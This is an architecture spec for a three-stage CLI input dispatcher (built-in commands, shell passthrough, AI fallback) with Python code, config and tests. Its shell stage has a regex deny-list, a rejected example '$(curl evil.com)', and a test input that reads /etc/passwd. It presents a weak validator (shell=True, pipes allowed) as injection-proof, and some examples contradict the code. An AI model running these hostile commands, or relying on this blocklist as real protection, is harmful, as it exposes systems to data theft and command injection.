# uCLI Command Dispatch Architecture — v1.4.4

**Status:** Architecture Specification
**Target:** Three-stage input dispatch chain (uCODE → shell → VIBE)
**Version:** v1.4.4

---

## Overview

The **Command Dispatch Chain** is a three-stage input routing system for uCLI that intelligently routes user input to the appropriate handler:

1. **Stage 1 (uCODE)** — Check if input matches canonical uDOS commands
2. **Stage 2 (Shell)** — Check if input is valid shell syntax (bash passthrough)
3. **Stage 3 (VIBE/OK)** — Route to Wizard AI service for natural language handling

### Design Goals

1. **Efficiency** — Fast matching for common cases (uCODE commands)
2. **Flexibility** — Support multiple command styles (uCODE, shell, natural language)
3. **Safety** — Prevent shell injection or data exfiltration via stage 2
4. **Fallback** — Graceful degradation when earlier stages don't match
5. **Transparency** — User can see dispatch reasoning via `--dispatch-debug`

---

## Stage 1: uCODE Command Matching

### Registry

```python
# core/services/command_dispatch_service.py

UCODE_REGISTRY = {
    # Command name → handler function
    "HELP": handle_help,
    "HEALTH": handle_health,
    "VERIFY": handle_verify,
    "PLACE": handle_place,
    "BINDER": handle_binder,
    "DRAW": handle_draw,
    "RUN": handle_run,
    "PLAY": handle_play,
    "RULE": handle_rule,
    "LIBRARY": handle_library,
}

# Aliases and variations
UCODE_ALIASES = {
    "?": "HELP",
    "h": "HEALTH",
    "p": "PLACE",
    "ls": "BINDER",
}
```

### Matching Algorithm

```python
def match_ucode_command(input_str: str) -> Tuple[Optional[str], float]:
    """
    Attempt to match input to uCODE command.

    Returns: (command_name, confidence_score) where confidence 0.0-1.0
    """
    tokens = tokenize(input_str)
    if not tokens:
        return None, 0.0

    first_token = tokens[0].upper()

    # Exact match
    if first_token in UCODE_REGISTRY:
        return first_token, 1.0  # 100% confidence

    # Alias match
    if first_token in UCODE_ALIASES:
        canonical = UCODE_ALIASES[first_token]
        return canonical, 0.95  # 95% confidence

    # Prefix match (abbreviation)
    matches = [cmd for cmd in UCODE_REGISTRY if cmd.startswith(first_token)]
    if len(matches) == 1:
        return matches[0], 0.90  # 90% confidence (ambiguous)
    elif len(matches) > 1:
        return None, 0.0  # Ambiguous abbreviation

    # Typo correction (Levenshtein distance)
    distances = {
        cmd: levenshtein_distance(first_token, cmd)
        for cmd in UCODE_REGISTRY
    }
    best_match = min(distances, key=distances.get)
    if distances[best_match] <= 1:  # 1 character difference
        return best_match, 0.80  # 80% confidence (typo correction)

    return None, 0.0  # No match
```

### Dispatch Decision

```python
if confidence >= 0.95:
    # High confidence: execute immediately
    return execute_ucode(command, args)
elif confidence >= 0.80:
    # Medium confidence: ask user
    user_choice = ask_user(f"Did you mean: {command}? (y/n/skip) ")
    if user_choice == "y":
        return execute_ucode(command, args)
    elif user_choice == "skip":
        continue_to_stage_2()
    else:
        return None
else:
    # No match: proceed to Stage 2
    continue_to_stage_2()
```

### Examples

| Input | Confidence | Action |
|-------|-----------|--------|
| `HELP` | 1.0 | Execute immediately |
| `help` | 1.0 | Execute immediately (case-insensitive) |
| `h` | 0.95 | Execute as alias (HELP) |
| `PLAC` | 0.90 | Ask: "Did you mean PLACE?" |
| `HEALT` | 0.80 | Typo? Ask user |
| `echo hello` | 0.0 | No match, proceed to Stage 2 |

---

## Stage 2: Shell Syntax Validation

### Purpose

Allow users to run shell commands directly from uCLI, but safely (no injection attacks).

### Safety Checks

```python
def validate_shell_syntax(input_str: str) -> Tuple[bool, str]:
    """
    Validate shell syntax is safe to execute.

    Returns: (is_safe, reason)
    """
    # Reject dangerous patterns
    dangerous_patterns = [
        r'\$\(',           # Command substitution $(...)
        r'`.*`',          # Backtick substitution `...`
        r'>\s*/',         # Redirect to root
        r'>>\s*/',        # Append to root
        r'rm\s+-rf',      # Force recursive delete
        r'sudo',          # Privilege escalation
        r'dd\s+if=',      # Raw disk operations
    ]

    for pattern in dangerous_patterns:
        if re.search(pattern, input_str, re.IGNORECASE):
            return False, f"Dangerous pattern detected: {pattern}"

    # Check for valid shell syntax
    try:
        ast = parse_shell_syntax(input_str)
        return True, "Valid shell syntax"
    except SyntaxError as e:
        return False, f"Shell syntax error: {e}"
```

### Execution

```python
def execute_shell_command(input_str: str) -> str:
    """Execute validated shell command."""
    is_safe, reason = validate_shell_syntax(input_str)
    if not is_safe:
        raise CommandError(
            code="ERR_SHELL_UNSAFE",
            message=f"Shell command rejected: {reason}",
            recovery_hint="Use uCODE commands (HELP to list) or rephrase as a question for AI."
        )

    # Execute in restricted subprocess
    try:
        result = subprocess.run(
            input_str,
            shell=True,
            capture_output=True,
            timeout=30,
            cwd=SAFE_CWD
        )
        return result.stdout.decode()
    except subprocess.TimeoutExpired:
        raise CommandError(
            code="ERR_SHELL_TIMEOUT",
            message="Command execution timed out after 30s",
            recovery_hint="Try a simpler command or check the system load."
        )
```

### Examples

| Input | Validation | Action |
|-------|-----------|--------|
| `ls -la` | ✓ Safe | Execute |
| `pwd` | ✓ Safe | Execute |
| `echo $HOME` | ✓ Safe (variable only) | Execute |
| `rm -rf /` | ✗ Dangerous | Reject |
| `$(curl evil.com)` | ✗ Dangerous | Reject |
| `cat file \| grep pattern` | ✓ Valid | Execute |

---

## Stage 3: VIBE/OK Fallback

### Purpose

When input doesn't match uCODE or shell, route to Wizard's VIBE/OK service for AI-powered natural language handling.

### Protocol

```python
def route_to_vibe(input_str: str) -> str:
    """
    Send unmatched input to Wizard VIBE service.

    VIBE (Versatile Input By Example) is Wizard's natural language
    understanding service. It can:
    - Answer questions
    - Generate responses
    - Suggest uCODE commands
    - Execute complex workflows
    """
    try:
        # Connect to Wizard (localhost:9000 by default)
        response = requests.post(
            "http://localhost:9000/api/v1/vibe/query",
            json={
                "input": input_str,
                "context": {
                    "workspace": get_current_workspace(),
                    "user": get_current_user(),
                }
            },
            timeout=5
        )

        if response.status_code == 200:
            result = response.json()
            return result.get("response", "")
        else:
            raise ServiceError(f"VIBE returned {response.status_code}")

    except requests.ConnectionError:
        raise CommandError(
            code="ERR_WIZARD_OFFLINE",
            message="Wizard service not running (required for VIBE/OK)",
            recovery_hint="Start Wizard: `ucli wizard start`. Or use uCODE commands (no internet needed)."
        )
```

### Examples

| Input | Route | Result |
|-------|-------|--------|
| `What is my workspace?` | VIBE | AI: "Your current workspace is @vault with 42 documents." |
| `Show me all commands` | VIBE | AI: "See HELP for list. Want help with specific task?" |
| `Create a new note` | VIBE | AI: "Use: BINDER --create my-note.md" + likely creates it |
| `How do I play nethack?` | VIBE | AI: "Run: PLAY @profile/nethack" + explanation |

---

## Complete Dispatch Chain

```python
def dispatch_input(user_input: str) -> str:
    """
    Route user input through three-stage dispatch chain.
    """
    logger = get_logger(__name__)
    debug = user_input.startswith("--dispatch-debug ")

    if debug:
        actual_input = user_input.replace("--dispatch-debug ", "", 1)
        logger.info(f"[DISPATCH DEBUG] Input: {actual_input}")
    else:
        actual_input = user_input

    # STAGE 1: uCODE Command Matching
    logger.debug("[STAGE 1] Attempting uCODE command match...")
    command, confidence = match_ucode_command(actual_input)

    if debug:
        logger.info(f"[DISPATCH] Stage 1 result: command={command}, confidence={confidence:.2%}")

    if confidence >= 0.95:
        logger.debug("[STAGE 1] High-confidence match, executing uCODE...")
        try:
            return execute_ucode_command(command, actual_input)
        except Exception as e:
            logger.error(f"[STAGE 1] uCODE execution failed: {e}")
            # Don't fall through; return error
            raise

    # STAGE 2: Shell Syntax Validation
    logger.debug("[STAGE 2] Attempting shell command execution...")
    is_safe, reason = validate_shell_syntax(actual_input)

    if debug:
        logger.info(f"[DISPATCH] Stage 2 result: is_safe={is_safe}, reason={reason}")

    if is_safe:
        logger.debug("[STAGE 2] Shell syntax valid, executing...")
        try:
            return execute_shell_command(actual_input)
        except Exception as e:
            logger.error(f"[STAGE 2] Shell execution failed: {e}")
            # Fall through to Stage 3
            pass
    else:
        logger.debug(f"[STAGE 2] Shell validation failed: {reason}")

    # STAGE 3: VIBE/OK Fallback
    logger.debug("[STAGE 3] Routing to VIBE/OK service...")
    try:
        if debug:
            logger.info(f"[DISPATCH] Stage 3: routing to VIBE")
        return route_to_vibe(actual_input)
    except CommandError as e:
        logger.error(f"[STAGE 3] VIBE routing failed: {e}")
        raise
```

---

## Debug Mode

### Invocation

```bash
# Show dispatch reasoning for a command
ucli --dispatch-debug "help place"

# Output:
# [DISPATCH DEBUG] Input: help place
# [DISPATCH] Stage 1 result: command=HELP, confidence=1.00
# [DISPATCH] Routing to uCODE handler...
# [HELP] PLACE — Switch or list workspaces
# ...
```

```bash
# Debug an ambiguous input
ucli --dispatch-debug "x"

# Output:
# [DISPATCH DEBUG] Input: x
# [DISPATCH] Stage 1 result: command=None, confidence=0.00
# [DISPATCH] Stage 2 result: is_safe=true, reason=Valid shell syntax
# [DISPATCH] Attempting shell execution...
# bash: x: command not found
# [DISPATCH] Shell failed, routing to Stage 3...
# [DISPATCH] Stage 3: routing to VIBE
# [VIBE] Did you mean: 'ex' editor? Or ask a question?
```

---

## Performance Targets

| Stage | Operation | Target Latency | Notes |
|-------|-----------|----------------|-------|
| 1 | uCODE matching | <10ms | Fast hashmap lookup |
| 2 | Shell validation | <50ms | Regex pattern matching |
| 3 | VIBE lookup | <500ms | Network RPC to Wizard |

**Total dispatch latency:** <600ms (user perceives as instant)

---

## Testing Strategy

### Unit Tests

```python
# tests/v1_4_4_command_dispatch_chain_test.py

class TestStage1UcodeMatching(unittest.TestCase):
    def test_exact_match_help(self):
        cmd, conf = match_ucode_command("HELP")
        assert cmd == "HELP" and conf == 1.0

    def test_case_insensitive_help(self):
        cmd, conf = match_ucode_command("help")
        assert cmd == "HELP" and conf == 1.0

    def test_alias_match(self):
        cmd, conf = match_ucode_command("h")
        assert cmd == "HEALTH" and conf == 0.95

    def test_typo_correction(self):
        cmd, conf = match_ucode_command("PLAC")
        assert cmd == "PLACE" and conf == 0.90

    def test_no_match(self):
        cmd, conf = match_ucode_command("xyz")
        assert cmd is None and conf == 0.0

class TestStage2ShellValidation(unittest.TestCase):
    def test_safe_ls(self):
        safe, _ = validate_shell_syntax("ls -la")
        assert safe is True

    def test_reject_rm_rf(self):
        safe, _ = validate_shell_syntax("rm -rf /")
        assert safe is False

    def test_reject_command_substitution(self):
        safe, _ = validate_shell_syntax("echo $(cat /etc/passwd)")
        assert safe is False

class TestStage3VibeRouting(unittest.TestCase):
    @mock.patch('requests.post')
    def test_vibe_query_success(self, mock_post):
        mock_post.return_value.status_code = 200
        mock_post.return_value.json.return_value = {
            "response": "Your workspace is @vault"
        }
        result = route_to_vibe("What workspace am I in?")
        assert "vault" in result

    @mock.patch('requests.post')
    def test_vibe_timeout_fallback(self, mock_post):
        mock_post.side_effect = requests.Timeout()
        with pytest.raises(CommandError) as exc:
            route_to_vibe("Some query")
        assert exc.value.code == "ERR_WIZARD_OFFLINE"

class TestDispatchChain(unittest.TestCase):
    def test_dispatch_ucode_priority(self):
        # uCODE should always win if high-confidence match
        result = dispatch_input("HELP")
        assert "Command Reference" in result

    def test_dispatch_shell_fallback(self):
        # Shell should run if uCODE doesn't match
        result = dispatch_input("pwd")
        assert result.strip() != ""  # Returns directory

    def test_dispatch_safety_blocks_dangerous(self):
        # Dangerous shell commands should be blocked
        with pytest.raises(CommandError) as exc:
            dispatch_input("rm -rf /")
        assert "Dangerous" in str(exc.value)
```

### Integration Tests

```python
# tests/v1_4_4_dispatch_integration_test.py

class TestDispatchRealWorld(unittest.TestCase):
    def test_typical_help_query(self):
        result = dispatch_input("HELP PLACE")
        assert "PLACE" in result

    def test_typical_shell_query(self):
        result = dispatch_input("echo hello")
        assert "hello" in result

    def test_ambiguous_abbreviation_handling(self):
        # "P" could be PLACE or PLAY; should ask user
        result = dispatch_input("P --list")
        assert "ambiguous" in result.lower() or "did you mean" in result.lower()
```

---

## Validation Checklist (v1.4.4)

- [ ] Stage 1: uCODE registry complete with all P0 commands
- [ ] Stage 1: Alias system working (h→HEALTH, p→PLACE, etc.)
- [ ] Stage 1: Typo correction via Levenshtein distance
- [ ] Stage 2: Shell syntax validator implemented
- [ ] Stage 2: Dangerous pattern detection (rm -rf, sudo, etc.)
- [ ] Stage 2: Subprocess execution with timeout
- [ ] Stage 3: VIBE routing protocol working
- [ ] Stage 3: Graceful fallback if Wizard offline
- [ ] Debug mode: `--dispatch-debug` shows full routing
- [ ] Performance: total latency <600ms
- [ ] Tests: all three stages + integration coverage 90%+

---

## Configuration

### uCLI Config

```json
{
  "dispatch": {
    "stage1_ucode_enabled": true,
    "stage1_confidence_threshold": 0.95,
    "stage2_shell_enabled": true,
    "stage2_timeout_seconds": 30,
    "stage3_vibe_enabled": true,
    "stage3_wizard_url": "http://localhost:9000",
    "stage3_timeout_seconds": 5,
    "debug_mode": false
  }
}
```

### Runtime Override

```bash
# Enable debug for single command
ucli --dispatch-debug "HELP"

# Disable shell passthrough (stage 2 only)
ucli --no-shell "some input"

# Offline mode (skip stage 3 VIBE)
ucli --offline "HELP"
```

---

## References

- [docs/roadmap.md#v1.4.4](../roadmap.md#v144--core-hardening-demo-scripts--educational-distribution)
- [bin/ucli](../../bin/ucli) — Main CLI entry point
- [core/services/command_parser.py](../../core/services/command_parser.py) — Tokenization
- [Wizard VIBE Service](../../wizard/services/) — Natural language handling
